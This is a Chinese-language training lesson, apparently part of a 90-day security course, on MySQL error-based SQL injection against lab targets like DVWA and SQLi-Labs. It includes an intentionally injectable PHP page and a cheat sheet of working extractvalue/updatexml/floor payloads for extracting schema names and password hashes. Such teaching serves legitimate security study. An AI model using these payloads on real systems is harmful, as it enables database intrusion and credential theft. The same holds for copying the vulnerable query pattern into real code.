---
title: Day033：SQL 注入进阶 - 报错注入
tags:
  - 网络安全
  - SQL注入
  - 报错注入
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d033
date: 2026-02-24
updated: 2026-01-28
---

# Day033：SQL 注入进阶 - 报错注入

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 6：SQL 注入进阶 |
| **今日主题** | 报错注入原理与实战 |
| **预计时间** | 2.5 小时 |
| **难度等级** | 进阶 |

---

## 今日痛点场景

> **场景**：你找到一个注入点，Union 注入不行（列数不匹配），盲注太慢。但你发现页面会显示 MySQL 错误信息...
>
> **问题**：能不能利用错误信息直接带出数据？
>
> **今天的任务**：学习报错注入，让数据库"主动"把数据吐出来。

---

## 今日目标

- [ ] 理解报错注入的原理
- [ ] 掌握 `extractvalue()` 报错注入
- [ ] 掌握 `updatexml()` 报错注入
- [ ] 成功通过报错获取数据

**闯关条件**：使用报错注入获取 DVWA 数据库版本。

---

## 实战任务（先动手！）

### 任务 1：寻找报错环境（15 分钟）

**说明**：DVWA 默认不显示详细错误，需要找其他靶场或自己搭建

**选项 A：使用 SQLi-Labs**
- 关卡 5、6 专门练习报错注入

**选项 B：自建测试页面**
```php
<?php
$id = $_GET['id'];
$conn = mysqli_connect("localhost", "root", "password", "test");
$sql = "SELECT * FROM users WHERE id = $id";
$result = mysqli_query($conn, $sql);
if (!$result) {
    echo mysqli_error($conn);  // 显示错误信息
}
?>
```

**记录**：
```
使用的测试环境：________________
```

---

### 任务 2：extractvalue() 报错注入（30 分钟）

**Payload 模板**：
```sql
and extractvalue(1, concat(0x7e, (查询语句), 0x7e))
```

**操作步骤**：

1. 获取数据库版本：
```sql
1 and extractvalue(1, concat(0x7e, version(), 0x7e))
```

2. 获取当前数据库名：
```sql
1 and extractvalue(1, concat(0x7e, database(), 0x7e))
```

3. 获取用户名：
```sql
1 and extractvalue(1, concat(0x7e, user(), 0x7e))
```

**记录**：
```
数据库版本：________________
数据库名：________________
用户名：________________
```

---

### 任务 3：updatexml() 报错注入（30 分钟）

**Payload 模板**：
```sql
and updatexml(1, concat(0x7e, (查询语句), 0x7e), 1)
```

**操作步骤**：

1. 获取表名：
```sql
1 and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=database() limit 0,1), 0x7e), 1)
```

2. 获取列名：
```sql
1 and updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_name='users' limit 0,1), 0x7e), 1)
```

**记录**：
```
获取的表名：________________
获取的列名：________________
```

---

### 任务 4：获取完整数据（30 分钟）

**问题**：报错信息有长度限制（约 32 字符）

**解决方案**：使用 `substr()` 分段获取

```sql
-- 获取前 30 个字符
1 and extractvalue(1, concat(0x7e, substr((select password from users limit 0,1), 1, 30), 0x7e))

-- 获取 31-60 字符
1 and extractvalue(1, concat(0x7e, substr((select password from users limit 0,1), 31, 30), 0x7e))
```

**记录**：
```
获取的密码哈希：________________
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 理解报错注入原理 | 15 分 |
| 成功使用 extractvalue() | 25 分 |
| 成功使用 updatexml() | 25 分 |
| 成功获取表名和列名 | 20 分 |
| 掌握分段获取技巧 | 15 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### 报错注入原理

```
核心思想：构造特殊的 SQL 语句，使数据库报错
        错误信息中包含我们想要的数据

extractvalue() / updatexml() 期望正确的 XPath 表达式
如果传入非法表达式（如 ~version()~），会报错并显示内容
```

### extractvalue() 函数

**正常用途**：从 XML 中提取值

**报错利用**：
```sql
extractvalue(xml_document, xpath_expression)

-- 当 xpath_expression 格式错误时，MySQL 会报错并显示表达式内容
extractvalue(1, concat(0x7e, version(), 0x7e))
-- 报错：XPATH syntax error: '~5.7.33~'
```

**0x7e 是什么**：`~` 的十六进制，用于标记数据边界

### updatexml() 函数

**正常用途**：更新 XML 中的值

**报错利用**：
```sql
updatexml(xml_document, xpath_expression, new_value)

-- 同样利用 XPath 错误
updatexml(1, concat(0x7e, database(), 0x7e), 1)
-- 报错：XPATH syntax error: '~dvwa~'
```

### 其他报错函数

| 函数 | Payload 示例 |
|------|--------------|
| `floor()` | `select count(*) from (select 1 union select null union select !1) a group by concat(version(),floor(rand(0)*2))` |
| `exp()` | `exp(~(select * from (select user())a))` |
| `geometrycollection()` | `geometrycollection((select * from(select * from(select user())a)b))` |

### 报错注入 vs 其他注入

| 类型 | 特点 | 速度 |
|------|------|------|
| Union 注入 | 需要列数匹配 | 最快 |
| 报错注入 | 需要显示错误 | 快 |
| 布尔盲注 | 页面有变化 | 慢 |
| 时间盲注 | 无需任何回显 | 最慢 |

### 长度限制问题

**extractvalue/updatexml 错误信息限制约 32 字符**

**解决方案**：

1. 使用 `substr()` 分段：
```sql
substr((select password from users), 1, 30)
substr((select password from users), 31, 30)
```

2. 使用 `mid()` 函数（等效于 substr）

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| 错误不显示 | 页面空白 | 环境配置了 error_reporting(0) |
| 数据被截断 | 只显示部分 | 使用 substr 分段获取 |
| 特殊字符问题 | 报错语法错误 | 用 hex 编码处理 |
| MySQL 5.1 以下 | 函数不存在 | 用 floor() 报错 |

---

## 知识卡片速查

### 报错注入 Payload 速查

```sql
# extractvalue
and extractvalue(1,concat(0x7e,version(),0x7e))
and extractvalue(1,concat(0x7e,database(),0x7e))
and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))

# updatexml
and updatexml(1,concat(0x7e,version(),0x7e),1)
and updatexml(1,concat(0x7e,database(),0x7e),1)
and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e),1)

# floor（通用性更好）
and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)
```

### 分段获取模板

```sql
# 第 1-30 字符
substr((查询语句), 1, 30)

# 第 31-60 字符
substr((查询语句), 31, 30)

# 完整 payload
and extractvalue(1,concat(0x7e,substr((select password from users limit 0,1),1,30),0x7e))
```

---

## 常见问题

**Q1：什么时候用报错注入？**

A1：
1. 页面显示数据库错误信息
2. Union 注入不可用（列数问题、WAF 拦截）
3. 盲注太慢，想快速验证

**Q2：extractvalue 和 updatexml 有什么区别？**

A2：功能类似，都是利用 XPath 错误。updatexml 需要三个参数，extractvalue 需要两个。根据 WAF 规则选用。

**Q3：报错信息被过滤了怎么办？**

A3：
1. 尝试其他报错函数（floor、exp）
2. 降级使用盲注
3. 检查是否有其他回显点

---

## 明日预告

**Day 034：SQL 注入进阶 - WAF 绕过技巧**

明天你将：
- 学习常见 WAF 的检测原理
- 掌握大小写、编码、注释等绕过技巧
- 实战绕过安全狗、云锁等 WAF

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 使用的测试环境 | |
| 成功的 payload | |
| 今日收获 | |

---

> **导师点评**：
>
> 报错注入是"中间路线"——比 Union 注入条件苛刻，但比盲注快得多。
>
> 关键是：**页面要显示错误信息**。现在很多网站都关闭了详细错误，所以报错注入的使用场景在减少。
>
> 但在内网渗透、开发环境测试中，报错注入依然是利器。
>
> 记住这句话：**能报错，就不盲注；能 Union，就不报错**。效率优先。

```bash
echo "Day 033 Complete! 报错注入技能 GET！"
```
